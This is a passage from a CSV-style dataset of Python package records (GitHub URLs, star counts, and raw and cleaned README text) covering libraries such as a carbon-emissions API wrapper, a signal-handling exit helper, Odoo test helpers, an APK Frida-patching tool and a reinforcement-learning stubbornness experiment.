",vladpy8/gearwheels
airflow-kubernetes-job-operator-test26,https://github.com/LamaAni/KubernetesJobOperator,5,72,72,"Please see readme.md @ https://github.com/LamaAni/KubernetesJobOperator
","Please see readme.md @ https://github.com/LamaAni/KubernetesJobOperator
",lamaani/kubernetesjoboperator
ditchcarbon-python,https://github.com/ditchthis/ditchcarbon-python,2,2233,2125,"<div align=""center"">
  <img src=""https://ditchcarbon.com/wp-content/uploads/2021/05/Group-119.svg""><br>
</div>

-----------------

# ditchcarbon-python

![PyPI](https://img.shields.io/pypi/v/ditchcarbon-python?color=5CB381)
![PyPI - Downloads](https://img.shields.io/pypi/dm/ditchcarbon-python?color=5CB381)
![PyPI - License](https://img.shields.io/pypi/l/ditchcarbon-python?color=5CB381)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/ditchcarbon-python?color=5CB381)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/ditchthis/ditchcarbon-python?color=5CB381)
[![Code style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

## What is it?

**ditchcarbon-python** is the official Python wrapper for the DitchCarbon API. DitchCarbon calculates the carbon impact of almost anything using a combination of GHG protocol approved calculations and an unparalleled database of company and product disclosures.

## Where to get it?

You can install the library via PyPI (hosted [here](https://pypi.org/project/ditchcarbon-python)):

```sh
pip3 install ditchcarbon-python
```

The source code is currently hosted on GitHub, [here](https://github.com/ditchthis/ditchcarbon-python).

## How to use it?

First, import and initialise the library with your API token:

```python
from ditchcarbon_python import Client
ditchcarbon = Client(token=""YOUR_TOKEN"")
```

Then, use it:

```python
# Activities
ditchcarbon.activities.retrieve(1)
ditchcarbon.activities.retrieve_many(**params)
ditchcarbon.activities.retrieve_assessment(1, **params)
ditchcarbon.activities.retrieve_categories(**params)

# Categories
ditchcarbon.categories.search(**params)

# Expenses
ditchcarbon.expenses.calculate_emissions(**params)

# Products
ditchcarbon.products.calculate_emissions(**params)

# Servers
ditchcarbon.servers.find(**params)
ditchcarbon.servers.retrieve(1)
ditchcarbon.servers.calculate_emissions(1, **params)

# Suppliers
ditchcarbon.suppliers.calculate_emissions(**params)
```

## Documentation and Help
View our API reference [here](https://docs.ditchcarbon.com/reference). For usage questions, feel free to contact us [here](mailto:enquiries@ditchcarbon.com).
","



-----------------

# ditchcarbon-python

![PyPI](https://img.shields.io/pypi/v/ditchcarbon-python?color=5CB381)
![PyPI - Downloads](https://img.shields.io/pypi/dm/ditchcarbon-python?color=5CB381)
![PyPI - License](https://img.shields.io/pypi/l/ditchcarbon-python?color=5CB381)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/ditchcarbon-python?color=5CB381)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/ditchthis/ditchcarbon-python?color=5CB381)
[![Code style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

## What is it?

**ditchcarbon-python** is the official Python wrapper for the DitchCarbon API. DitchCarbon calculates the carbon impact of almost anything using a combination of GHG protocol approved calculations and an unparalleled database of company and product disclosures.

## Where to get it?

You can install the library via PyPI (hosted [here](https://pypi.org/project/ditchcarbon-python)):

```sh
pip3 install ditchcarbon-python
```

The source code is currently hosted on GitHub, [here](https://github.com/ditchthis/ditchcarbon-python).

## How to use it?

First, import and initialise the library with your API token:

```python
from ditchcarbon_python import Client
ditchcarbon = Client(token=""YOUR_TOKEN"")
```

Then, use it:

```python
# Activities
ditchcarbon.activities.retrieve(1)
ditchcarbon.activities.retrieve_many(**params)
ditchcarbon.activities.retrieve_assessment(1, **params)
ditchcarbon.activities.retrieve_categories(**params)

# Categories
ditchcarbon.categories.search(**params)

# Expenses
ditchcarbon.expenses.calculate_emissions(**params)

# Products
ditchcarbon.products.calculate_emissions(**params)

# Servers
ditchcarbon.servers.find(**params)
ditchcarbon.servers.retrieve(1)
ditchcarbon.servers.calculate_emissions(1, **params)

# Suppliers
ditchcarbon.suppliers.calculate_emissions(**params)
```

## Documentation and Help
View our API reference [here](https://docs.ditchcarbon.com/reference). For usage questions, feel free to contact us [here](mailto:enquiries@ditchcarbon.com).
",ditchthis/ditchcarbon-python
xgrid,https://github.com/yhl1219/xgrid,0,1004,1004,"# XGrid

## Installation

```
pip install xgrid
```

## Test

Invoke `python3 test.py` in the root folder to perform the test cases.

## Usage

See document for more information. Let's start with a simple kernel, the element-wise multiplication of two grid:

```python
import xgrid
import numpy as np
import random

xgrid.init()

fvec = xgrid.grid[float, 1]

@xgrid.kernel()
def elementwise_mul(result: fvec, a: fvec, b: fvec) -> None:
    result[0] = a[0] * b[0]
```

and let's define some data:

```python
a = xgrid.Grid((10000, ), float)
b = xgrid.Grid((10000, ), float)

for i in range(10000):
    a[i] = random.random()
    b[i] = random.random()
```

and the result:

```python
result = xgrid.Grid((10000, ), float)
```

and invoke the kernel:

```python
elementwise_mul(result, a, b)
```

We could check the result using numpy dot:

```
assert np.sum(result.now) == np.dot(a.now, b.now)
```

## Examples

Solve the 2D Cavity flow with `xgrid`, see in examples folder.

![cavity](./imgs/cavity.png)","# XGrid

## Installation

```
pip install xgrid
```

## Test

Invoke `python3 test.py` in the root folder to perform the test cases.

## Usage

See document for more information. Let's start with a simple kernel, the element-wise multiplication of two grid:

```python
import xgrid
import numpy as np
import random

xgrid.init()

fvec = xgrid.grid[float, 1]

@xgrid.kernel()
def elementwise_mul(result: fvec, a: fvec, b: fvec) -> None:
    result[0] = a[0] * b[0]
```

and let's define some data:

```python
a = xgrid.Grid((10000, ), float)
b = xgrid.Grid((10000, ), float)

for i in range(10000):
    a[i] = random.random()
    b[i] = random.random()
```

and the result:

```python
result = xgrid.Grid((10000, ), float)
```

and invoke the kernel:

```python
elementwise_mul(result, a, b)
```

We could check the result using numpy dot:

```
assert np.sum(result.now) == np.dot(a.now, b.now)
```

## Examples

Solve the 2D Cavity flow with `xgrid`, see in examples folder.

![cavity](./imgs/cavity.png)",yhl1219/xgrid
lazytensor,https://github.com/kushalkolar/lazytensor,1,84,84,"# lazytensor
An interface for lazy evaluation of tensors in linear algebra routines
","# lazytensor
An interface for lazy evaluation of tensors in linear algebra routines
",kushalkolar/lazytensor
apkmod,https://github.com/mon231/apkpatcher/,2,1328,1291,"# apkpatcher
Corss-Platform script used to inject frida scripts and gadget to an APK <br />
This project started as a fork of [apkpatcher](https://github.com/badadaf/apkpatcher) <br />
<br />
*NOTE* that you should use this tool for debugging / educational purposes only!

## Installation
After you made sure that all of the requirements are met, <br />
You may install the package and use the cmdline tool `apkmod`, which comes with the cmdline tool [`buildapp`](https://github.com/mon231/buildapp) <br />

> pip install apkmod

## Patching process
This tool gets an android app installation file (`.apk`) and a [frida js-script](https://frida.re/docs/javascript-api/) <br />
Then builds a new apk with frida-gadget & script runner ready to be installed on non-rooted android devices!

## Requirements
The project assumes that installer already has the following tools in his path:
- android SDK tools (installed from android-sdk online)
  - aapt (default at SDK\build_tools)
  - zipalign (default at SDK\build_tools)
  - apksigner (default at SDK\build_tools)
  - adb (default at SDK\platform_tools, only required if `-i` flag is used)
- apktool [installation manual](https://ibotpeaches.github.io/Apktool/install/)
- keytool (default at jdk or jre bin folders, only required if `-k` flag is missing)
","# apkpatcher
Corss-Platform script used to inject frida scripts and gadget to an APK 
This project started as a fork of [apkpatcher](https://github.com/badadaf/apkpatcher) 

*NOTE* that you should use this tool for debugging / educational purposes only!

## Installation
After you made sure that all of the requirements are met, 
You may install the package and use the cmdline tool `apkmod`, which comes with the cmdline tool [`buildapp`](https://github.com/mon231/buildapp) 

> pip install apkmod

## Patching process
This tool gets an android app installation file (`.apk`) and a [frida js-script](https://frida.re/docs/javascript-api/) 
Then builds a new apk with frida-gadget & script runner ready to be installed on non-rooted android devices!

## Requirements
The project assumes that installer already has the following tools in his path:
- android SDK tools (installed from android-sdk online)
  - aapt (default at SDK\build_tools)
  - zipalign (default at SDK\build_tools)
  - apksigner (default at SDK\build_tools)
  - adb (default at SDK\platform_tools, only required if `-i` flag is used)
- apktool [installation manual](https://ibotpeaches.github.io/Apktool/install/)
- keytool (default at jdk or jre bin folders, only required if `-k` flag is missing)
",mon231/apkpatcher
chapsnap,https://github.com/rlaphoenix/ChapSnap,2,448,268,"# ChapSnap

Resync Chapters by snapping them to Scene Changes.

## To-do

- [x] Automatically replace the chapters in the input video container.

Likely lot's more.

## Contributors

<a href=""https://github.com/rlaphoenix""><img src=""https://images.weserv.nl/?url=avatars.githubusercontent.com/u/17136956?v=4&h=25&w=25&fit=cover&mask=circle&maxage=7d"" alt=""""/></a>

## License

© 2023 rlaphoenix — [GNU General Public License, Version 3.0](LICENSE)
","# ChapSnap

Resync Chapters by snapping them to Scene Changes.

## To-do

- [x] Automatically replace the chapters in the input video container.

Likely lot's more.

## Contributors



## License

© 2023 rlaphoenix — [GNU General Public License, Version 3.0](LICENSE)
",rlaphoenix/chapsnap
safe-exit,https://github.com/ZhangJianAo/safe-exit,1,2503,2503,"================
Safe Exit
================

Safe Exit is a Python package that provides functionality to handle graceful process termination.
The package allows users to register functions that will be called when the program exits.

Difference from atexit
========================

Python has a standard module called ``atexit`` that does something similar,
but ``atexit`` cannot handle cases where a program is killed by a signal not handled by Python.

Python only handles the SIGINT signal and does not handle SIGTERM, SIGQUIT, and SIGHUP signals.
On Windows, programs can also be killed by SIGBREAK and CTRL_CLOSE_EVENT.

Safe Exit can handle all these signals:

* On POSIX systems: ``SIGINT``, ``SIGTERM``, ``SIGQUIT``, and ``SIGHUP``
* On Windows:

  - ``SIGINT``, ``SIGTERM``, ``SIGBREAK``

  - ``CTRL_CLOSE_EVENT``, ``CTRL_LOGOFF_EVENT``, ``CTRL_SHUTDOWN_EVENT``

Windows also has ``CTRL_C_EVENT`` and ``CTRL_BREAK_EVENT``
which Python translate to ``SIGINT`` and ``SIGBREAK`` signals, respectively.
On windows, ``SIGTERM`` is implemented only  for the current process,
there is no way to send ``SIGTERM`` to other processes.

Installation
============

To install Safe Exit, simply run:

.. code-block:: bash

    pip install safe-exit

Usage
=====

Just register a cleanup function like you would with `atexit`:

.. code-block:: python

    import safe_exit

    def cleanup_function():
        # Perform cleanup tasks

    safe_exit.register(cleanup_function)

The ``register`` function can also be used as a decorator:

.. code-block:: python

    @safe_exit.register
    def cleanup_function():
        # Perform cleanup tasks

Signal handling is configurable.
Call the ``config`` function before registering functions.
The following code configures ``safe_exit`` to handle SIGQUIT and SIGHUP signals:

.. code-block:: python

    from safe_exit import ConfigFlag, config, register
    config(ConfigFlag.SIGQUIT | ConfigFlag.SIGHUP)

    @register
    def cleanup()
        print(""clean up"")


To nicely kill a process, giving it a chance to clean up:

.. code-block:: python

    process_id = ...
    safe_exit.safe_kill(process_pid)

Contributing
============

Contributions to Safe Exit are welcome!
If you would like to contribute or have any ideas for improvements,
please feel free to open an issue on the project's issue tracker
or get in touch with the maintainer directly.

License
=======

Safe Exit is released under the MIT License. See the LICENSE.txt file for more details.
","================
Safe Exit
================

Safe Exit is a Python package that provides functionality to handle graceful process termination.
The package allows users to register functions that will be called when the program exits.

Difference from atexit
========================

Python has a standard module called ``atexit`` that does something similar,
but ``atexit`` cannot handle cases where a program is killed by a signal not handled by Python.

Python only handles the SIGINT signal and does not handle SIGTERM, SIGQUIT, and SIGHUP signals.
On Windows, programs can also be killed by SIGBREAK and CTRL_CLOSE_EVENT.

Safe Exit can handle all these signals:

* On POSIX systems: ``SIGINT``, ``SIGTERM``, ``SIGQUIT``, and ``SIGHUP``
* On Windows:

  - ``SIGINT``, ``SIGTERM``, ``SIGBREAK``

  - ``CTRL_CLOSE_EVENT``, ``CTRL_LOGOFF_EVENT``, ``CTRL_SHUTDOWN_EVENT``

Windows also has ``CTRL_C_EVENT`` and ``CTRL_BREAK_EVENT``
which Python translate to ``SIGINT`` and ``SIGBREAK`` signals, respectively.
On windows, ``SIGTERM`` is implemented only  for the current process,
there is no way to send ``SIGTERM`` to other processes.

Installation
============

To install Safe Exit, simply run:

.. code-block:: bash

    pip install safe-exit

Usage
=====

Just register a cleanup function like you would with `atexit`:

.. code-block:: python

    import safe_exit

    def cleanup_function():
        # Perform cleanup tasks

    safe_exit.register(cleanup_function)

The ``register`` function can also be used as a decorator:

.. code-block:: python

    @safe_exit.register
    def cleanup_function():
        # Perform cleanup tasks

Signal handling is configurable.
Call the ``config`` function before registering functions.
The following code configures ``safe_exit`` to handle SIGQUIT and SIGHUP signals:

.. code-block:: python

    from safe_exit import ConfigFlag, config, register
    config(ConfigFlag.SIGQUIT | ConfigFlag.SIGHUP)

    @register
    def cleanup()
        print(""clean up"")


To nicely kill a process, giving it a chance to clean up:

.. code-block:: python

    process_id = ...
    safe_exit.safe_kill(process_pid)

Contributing
============

Contributions to Safe Exit are welcome!
If you would like to contribute or have any ideas for improvements,
please feel free to open an issue on the project's issue tracker
or get in touch with the maintainer directly.

License
=======

Safe Exit is released under the MIT License. See the LICENSE.txt file for more details.
",zhangjianao/safe-exit
behave-odoo,https://github.com/coopdevs/behave_odoo,2,1765,1765,"# `behave_odoo`

behave_odoo is a Python package that provides a collection of helper functions designed to simplify the process of writing [behave](https://github.com/behave) tests for Odoo 14. The package includes functions for navigating the Odoo interface, interacting with form fields, and performing common actions within the Odoo environment.

## Installation

To install behave_odoo, use [pip](https://pypi.org/project/behave-odoo/):

```shell
pip install behave-odoo
```

## Usage

To use the behave_odoo in your project, simply import the functions you need:

```python
from behave_odoo import (
    is_tree_view_by_column_name,
    login,
    navigate_menu,
    switch_module,
    click_button,
    set_text_field,
    set_select_field,
    set_autocomplete_field,
    ensure_readonly_mode,
    select_dropdown_item,
    switch_form_tab,
    get_first_fields_from_tree_view,
)
```

Or use it with prefix:

```python
import behave_odoo as bodoo

@given('the user log in on the Odoo Instance')
def step_impl(context):
    bodoo.login(context)
```

Refer to the package's [documentation](https://coopdevs.github.io/behave_odoo/) for detailed information on each function and how to use them in your tests.

## Contributing

We welcome contributions to the behave_odoo project. If you find a bug or would like to request a new feature, please open an issue on the [project's issue tracker](https://github.com/coopdevs/behave_odoo/issues). If you would like to contribute code, please fork the repository and submit a pull request.

## License

behave_odoo is released under the AGPL-3.0 License. See the `LICENSE` file for more information.

## Support

If you encounter any issues while using behave_odoo, please report them on the project's issue tracker.
","# `behave_odoo`

behave_odoo is a Python package that provides a collection of helper functions designed to simplify the process of writing [behave](https://github.com/behave) tests for Odoo 14. The package includes functions for navigating the Odoo interface, interacting with form fields, and performing common actions within the Odoo environment.

## Installation

To install behave_odoo, use [pip](https://pypi.org/project/behave-odoo/):

```shell
pip install behave-odoo
```

## Usage

To use the behave_odoo in your project, simply import the functions you need:

```python
from behave_odoo import (
    is_tree_view_by_column_name,
    login,
    navigate_menu,
    switch_module,
    click_button,
    set_text_field,
    set_select_field,
    set_autocomplete_field,
    ensure_readonly_mode,
    select_dropdown_item,
    switch_form_tab,
    get_first_fields_from_tree_view,
)
```

Or use it with prefix:

```python
import behave_odoo as bodoo

@given('the user log in on the Odoo Instance')
def step_impl(context):
    bodoo.login(context)
```

Refer to the package's [documentation](https://coopdevs.github.io/behave_odoo/) for detailed information on each function and how to use them in your tests.

## Contributing

We welcome contributions to the behave_odoo project. If you find a bug or would like to request a new feature, please open an issue on the [project's issue tracker](https://github.com/coopdevs/behave_odoo/issues). If you would like to contribute code, please fork the repository and submit a pull request.

## License

behave_odoo is released under the AGPL-3.0 License. See the `LICENSE` file for more information.

## Support

If you encounter any issues while using behave_odoo, please report them on the project's issue tracker.
",coopdevs/behave_odoo
pyfx-tool,https://github.com/archeraldrich/pyfx,1,2184,2184,"# PyFx

The Python version of the [non-interactive, JavaScript version](https://www.npmjs.com/package/fx) of the [**fx**](https://fx.wtf). Short for *PYthon Function eXecution* or *Pyf(x)*.

```bash
python3 -mpip install pyfx
```

Or install in develop mode:

```bash
git clone https://github.com/archeraldrich/pyfx
cd pyfx
python3 setup.py develop
```

## Usage

PyFx treats arguments as Python expressions or functions. PyFx passes the input data to the first expression or function and then passes the result of the first one to the second one and so on.

```bash
echo '{""name"": ""world""}' | pyfx 'lambda x: x[""name""]' 'lambda x: f""Hello, {x}!""'
```

Use `self` to access the input data. Use `.` at the start of the expression to access the input data without a `lambda x: x` part.

```python
echo '{""name"": ""world""}' | pyfx '.get(""name"")' 'f""Hello, {self}!""'
```

Use other Python functions to process the data.

```python
echo '{""name"": ""world""}' | pyfx 'dict.keys' 'list'
```

## Advanced Usage

PyFx can process a stream of JSON objects. PyFx will apply arguments to each object.

```bash
printf '{""name"": ""hello""}\n{""name"": ""world""}' | pyfx '.get(""name"")'
```

If you want to process a stream of JSON objects as a single list, use the **--slurp** or **-s** flag.

```python
printf '{""name"": ""hello""}\n{""name"": ""world""}' | pyfx --slurp 'list(map(lambda x: x.get(""name""), self))' '"", "".join'
```

If you want to process non-JSON data, use the **--raw** or **-r** flag.

```bash
ls | pyfx -r '[self, self.find("".md"") != -1]'
```

You can use **--raw** and **--slurp** (or **-rs**) together to get a single array of strings.

```bash
ls | pyfx -rs 'list(filter(lambda x: x.find("".md"") != -1, self))'
```

PyFx has a special symbol `skip` for skipping the printing of the result.

```bash
ls | pyfx -r 'self if self.find("".md"") != -1 else skip'
```

PyFx comes with the import statement. Use the **--import** or **-i** command once per import statement, without the leading `import` keyword. 

```bash
seq 1 100 | pyfx -rs -i 'numpy as np' -i 'from matplotlib import pyplot as plt' 'list(map(int, self))' 'np.array' 'plt.plot' 'lambda _: plt.show()'
```

## License

[MIT](LICENSE)
","# PyFx

The Python version of the [non-interactive, JavaScript version](https://www.npmjs.com/package/fx) of the [**fx**](https://fx.wtf). Short for *PYthon Function eXecution* or *Pyf(x)*.

```bash
python3 -mpip install pyfx
```

Or install in develop mode:

```bash
git clone https://github.com/archeraldrich/pyfx
cd pyfx
python3 setup.py develop
```

## Usage

PyFx treats arguments as Python expressions or functions. PyFx passes the input data to the first expression or function and then passes the result of the first one to the second one and so on.

```bash
echo '{""name"": ""world""}' | pyfx 'lambda x: x[""name""]' 'lambda x: f""Hello, {x}!""'
```

Use `self` to access the input data. Use `.` at the start of the expression to access the input data without a `lambda x: x` part.

```python
echo '{""name"": ""world""}' | pyfx '.get(""name"")' 'f""Hello, {self}!""'
```

Use other Python functions to process the data.

```python
echo '{""name"": ""world""}' | pyfx 'dict.keys' 'list'
```

## Advanced Usage

PyFx can process a stream of JSON objects. PyFx will apply arguments to each object.

```bash
printf '{""name"": ""hello""}\n{""name"": ""world""}' | pyfx '.get(""name"")'
```

If you want to process a stream of JSON objects as a single list, use the **--slurp** or **-s** flag.

```python
printf '{""name"": ""hello""}\n{""name"": ""world""}' | pyfx --slurp 'list(map(lambda x: x.get(""name""), self))' '"", "".join'
```

If you want to process non-JSON data, use the **--raw** or **-r** flag.

```bash
ls | pyfx -r '[self, self.find("".md"") != -1]'
```

You can use **--raw** and **--slurp** (or **-rs**) together to get a single array of strings.

```bash
ls | pyfx -rs 'list(filter(lambda x: x.find("".md"") != -1, self))'
```

PyFx has a special symbol `skip` for skipping the printing of the result.

```bash
ls | pyfx -r 'self if self.find("".md"") != -1 else skip'
```

PyFx comes with the import statement. Use the **--import** or **-i** command once per import statement, without the leading `import` keyword. 

```bash
seq 1 100 | pyfx -rs -i 'numpy as np' -i 'from matplotlib import pyplot as plt' 'list(map(int, self))' 'np.array' 'plt.plot' 'lambda _: plt.show()'
```

## License

[MIT](LICENSE)
",archeraldrich/pyfx
stubborn,https://github.com/cool-RR/stubborn,10,3857,3745,"# Stubborn: An Environment for Evaluating Stubbornness between Agents with Aligned Incentives

<!--* [Video](http://r.rachum.com/stubborn-workshop-video)-->
<!--* [Deck](http://r.rachum.com/stubborn-deck)-->

*Stubborn* is an experiment in the field of [multi-agent reinforcement learning](https://en.wikipedia.org/wiki/Multi-agent_reinforcement_learning). The goal of the experiment is to see whether reinforcement learning agents can learn to communicate important information to each other by fighting with each other, even though they are ""on the same side"". By running the experiment and generating plots using the commands documented below, you could replicate the results shown in our paper. By modifying the environment rules as defined in the code, you could extend the experiment to investigate this scenario in different ways.

*Stubborn* will be presented at the [Workshop on Rebellion and Disobedience in AI](https://sites.google.com/view/rad-ai/) at [The International Conference on Autonomous Agents and Multiagent Systems](https://aamas2023.soton.ac.uk/). Read the [full paper](http://r.rachum.com/stubborn-paper). Abstract:

> Recent research in multi-agent reinforcement learning (MARL) has shown success in learning social behavior and cooperation. Social dilemmas between agents in mixed-sum settings have been studied extensively, but there is little research into social dilemmas in fully cooperative settings, where agents have no prospect of gaining reward at another agentâ€™s expense.
>
> While fully-aligned interests are conducive to cooperation between agents, they do not guarantee it. We propose a measure of ""stubbornness"" between agents that aims to capture the human social behavior from which it takes its name: a disagreement that is gradually escalating and potentially disastrous. We would like to promote research into the tendency of agents to be stubborn, the reactions of counterpart agents, and the resulting social dynamics.
>
> In this paper we present Stubborn, an environment for evaluating stubbornness between agents with fully-aligned incentives. In our preliminary results, the agents learn to use their partnerâ€™s stubbornness as a signal for improving the choices that they make in the environment. [Continue reading...](http://r.rachum.com/stubborn-paper)


## Installation

```shell
python3 -m venv ""${HOME}/stubborn_env""
source ""${HOME}/stubborn_env/bin/activate""
pip3 install stubborn
```


## Documentation

Show list of commands:

```shell
python -m stubborn --help
```

Show arguments and options for a specific command:

```shell
python -m stubborn run --help
```


## Basic usage

### Running

Run the *Stubborn* experiment, training agents and evaluating their performance:

```shell
python3 -m stubborn run
```

### Plotting

There are two plot commands implemented. Each of them, by default, draws a plot for the very last run that you made.

Draw a plot showing the rewards of both agents as they learn:

```shell
python3 -m stubborn plot-reward
```

![plot-reward](misc/images/plot-reward.png)

Draw a plot showing the insistence of one agent as a function of the other agent's stubbornness, defined as $\zeta_{n,d}$ in the paper:

```shell
python3 -m stubborn plot-insistence
```

![plot-insistence](misc/images/plot-insistence.png)



## Citing

If you use *Stubborn* in your research, please cite the accompanying paper:

```bibtex
@article{Rachum2023Stubborn,
  title={Stubborn: An Environment for Evaluating Stubbornness between Agents with Aligned Incentives},
  author={Rachum, Ram and Nakar, Yonatan and Mirsky, Reuth},
  year = {2023},
  journal = {Proceedings of the Workshop on Rebellion and Disobedience in AI at The International Conference on Autonomous Agents and Multiagent Systems}
}
```
","# Stubborn: An Environment for Evaluating Stubbornness between Agents with Aligned Incentives




*Stubborn* is an experiment in the field of [multi-agent reinforcement learning](https://en.wikipedia.org/wiki/Multi-agent_reinforcement_learning). The goal of the experiment is to see whether reinforcement learning agents can learn to communicate important information to each other by fighting with each other, even though they are ""on the same side"". By running the experiment and generating plots using the commands documented below, you could replicate the results shown in our paper. By modifying the environment rules as defined in the code, you could extend the experiment to investigate this scenario in different ways.

*Stubborn* will be presented at the [Workshop on Rebellion and Disobedience in AI](https://sites.google.com/view/rad-ai/) at [The International Conference on Autonomous Agents and Multiagent Systems](https://aamas2023.soton.ac.uk/). Read the [full paper](http://r.rachum.com/stubborn-paper). Abstract:

> Recent research in multi-agent reinforcement learning (MARL) has shown success in learning social behavior and cooperation. Social dilemmas between agents in mixed-sum settings have been studied extensively, but there is little research into social dilemmas in fully cooperative settings, where agents have no prospect of gaining reward at another agentâ€™s expense.
>
> While fully-aligned interests are conducive to cooperation between agents, they do not guarantee it. We propose a measure of ""stubbornness"" between agents that aims to capture the human social behavior from which it takes its name: a disagreement that is gradually escalating and potentially disastrous. We would like to promote research into the tendency of agents to be stubborn, the reactions of counterpart agents, and the resulting social dynamics.
>
> In this paper we present Stubborn, an environment for evaluating stubbornness between agents with fully-aligned incentives. In our preliminary results, the agents learn to use their partnerâ€™s stubbornness as a signal for improving the choices that they make in the environment. [Continue reading...](http://r.rachum.com/stubborn-paper)


## Installation

```shell
python3 -m venv ""${HOME}/stubborn_env""
source ""${HOME}/stubborn_env/bin/activate""
pip3 install stubborn
```


## Documentation

Show list of commands:

```shell
python -m stubborn --help
```

Show arguments and options for a specific command:

```shell
python -m stubborn run --help
```


## Basic usage

### Running

Run the *Stubborn* experiment, training agents and evaluating their performance:

```shell
python3 -m stubborn run
```

### Plotting

There are two plot commands implemented. Each of them, by default, draws a plot for the very last run that you made.

Draw a plot showing the rewards of both agents as they learn:

```shell
python3 -m stubborn plot-reward
```

![plot-reward](misc/images/plot-reward.png)

Draw a plot showing the insistence of one agent as a function of the other agent's stubbornness, defined as $\zeta_{n,d}$ in the paper:

```shell
python3 -m stubborn plot-insistence
```

![plot-insistence](misc/images/plot-insistence.png)



## Citing

If you use *Stubborn* in your research, please cite the accompanying paper:

```bibtex
@article{Rachum2023Stubborn,
  title={Stubborn: An Environment for Evaluating Stubbornness between Agents with Aligned Incentives},
  author={Rachum, Ram and Nakar, Yonatan and Mirsky, Reuth},
  year = {2023},
  journal = {Proceedings of the Workshop on Rebellion and Disobedience in AI at The International Conference on Autonomous Agents and Multiagent Systems}
}
```
",cool-rr/stubborn
adaptive-cards-py,https://github.com/dennis6p/adaptive-cards-py,2,6764,6752,"# Adaptive Cards

A thin Python wrapper for creating [**Adaptive Cards**](https://adaptivecards.io/) easily on code level. The deep integration of Python's `typing` package prevents you from creating invalid schemes and guides you while creating visual apealing cards. 

If you are interested in the general concepts of adaptive cards and want to dig a bit deeper, have a look into the [**official documentation**](https://learn.microsoft.com/en-us/adaptive-cards/) or start a jump start and get used to the [**schema**](https://adaptivecards.io/explorer/).

💡 **Please note**
<br>This library is still in progress and is lacking some features. However, missing fractions are planned to be added soon. 

## About

This library is intended to provide a clear and simple interface for creating adaptive cards with only a few lines of code in a more robust way. The heavy usage of Python's typing library should
prevent one from creating invalid schemes and structures. Instead, creating cards should be intuitive and work like a breeze. 

For a comprehensive introduction into the main ideas and patterns of adaptive cards, have a look on the [**official documentation**](https://docs.microsoft.com/en-us/adaptive-cards). I also recommend using the [**schema explorer**](https://adaptivecards.io/explorer) page alongside the implementation, since the library's type system relies on these schemes.

💡 **Please note**
<br>It's highly recommended to turn on the **type check** capabilities for Python in your editor. This will serve you with direct feedback about the structures you create. If you are trying to assign values of incompatible types, your editor will mark it as such and yells at you right in the moment you are about to do so.

## Features

+ Type annotated components based on Python's **dataclasses**
+ Schema validation for version compatibility
+ Simple `JSON` export
+ Compliant with the official structures and ideas

## Dependencies

* Python 3.10+
* `dataclasses-json`
* `StrEnum`

## Installation

```bash
pip install adaptive-cards-py
```

## Library structure

**Adaptive cards** can consist of different kind of components. The four main categories beside the actual cards are **Elements**, **Containers**, **Actions** and **Inputs**. You can find all available components for each category within the corresponding file. The `AdaptiveCard` is defined in `cards.py`.

In addition to that, some fields of certain components are of custom types. These types are living inside the `card_types.py` file. For instance, if you are about to assign a color to a `TextBlock`, the field `color` will only accept a value of type `Colors`, which is implemented in the aforementioned Python file.

To perform validation on a fully initialized card, one can make use of the `SchemaValidator` class. Similar to the whole library, this class provides a simple interface with only on method. The validation currently checks whether all used fields are compliant with the overall card version

## Usage

### A simple card

A simple `TextBlock` lives in the `elements` module and can be used after it's import. 

```Python
from adaptive_cards.elements import TextBlock

text_block: TextBlock = TextBlock(text=""It's your first card"")
```
For this component, `text` is the only required property. However, if more customization is needed, further available fields can be used.

```Python
from adaptive_cards.elements import TextBlock
import adaptive_cards.card_types as types

text_block: TextBlock = TextBlock(
    text=""It's your second card""
    color=types.Colors.ACCENT,
    size=types.FontSize.EXTRA_LARGE,
    horizontal_alignment=types.HorizontalAlignment.CENTER,
)
```

An actual card with only this component can be created like this.

```Python
from adaptive_cards.card import AdaptiveCard

...

version: str = ""1.4""
card: AdaptiveCard = AdaptiveCard.new(version) \
                                 .add_item(text_block) \
                                 .create()
```

Find your final layout below.

![simple card](examples/simple_card/simple_card.jpg)

💡 **Please note**
<br>After building the object is done, the `create(...)` method must be called in order to create the final object. In this case, the object will be of type `AdaptiveCard`.

To directly export your result, make use of the 
`to_json()` method provided by every card.

```Python
with open(""path/to/out/file.json"", ""w+"") as f:
    f.write(card.to_json())

```

### Adding multiple elements at once

Assuming you have a bunch of elements you want your card to enrich with. There is also a method for doing so. Let's re-use the example from before, but add another `Image` element here as well. 

```Python
from adaptive_cards.elements import TextBlock, Image
import adaptive_cards.card_types as types

text_block: TextBlock = TextBlock(
    text=""It's your third card""
    color=types.Colors.ACCENT,
    size=types.FontSize.EXTRA_LARGE,
    horizontal_alignment=types.HorizontalAlignment.CENTER,
)

image: Image = Image(url=""https://adaptivecards.io/content/bf-logo.png"")

version: str = ""1.4""
card: AdaptiveCard = AdaptiveCard.new(version) \
                                 .add_items([text_block, image]) \
                                 .create()

# Alternatively, you can also chain multiple add_item(...) functions:
# card = AdaptiveCard.new(version) \
#                    .add_item(text_block) \
#                    .add_item(image) \
#                    .create()


with open(""path/to/out/file.json"", ""w+"") as f:
    f.write(card.to_json())
```

This will result in a card like shown below.

![simple card](examples/simple_card/simple_card_2.jpg)

### Validate schema

New components and fields are getting introduced every now and then. This means, if you are using an early version for a card and add fields, which are not compliant with it, you will have an invalid schema. To prevent you from exporting fields not yet supported by the card and target framework, a schema validation can be performed. It's as simple as that:

```Python
from adaptive_cards.validator import SchemaValidator, Result

...

version: str = ""1.4""
card: AdaptiveCard = AdaptiveCard.new(version) \
                                 .add_items([text_block, image]) \
                                 .create()

validator: SchemaValidator = SchemaValidator()
result: Result = validator.validate(card)

print(f""Validation was successful: {result == Result.SUCCESS}"")

```

## Examples

If you are interested in more comprehensive examples, have a look into the `examples` folder (coming soon!) or visit the samples page of the official documentation. 

## Roadmap

+ 🔎 More complete valdidation
+ 🚀 Better examples
+ 📕 Comprehensive documentation on code level
+ 🐍 Ready to use Python package
","# Adaptive Cards

A thin Python wrapper for creating [**Adaptive Cards**](https://adaptivecards.io/) easily on code level. The deep integration of Python's `typing` package prevents you from creating invalid schemes and guides you while creating visual apealing cards. 

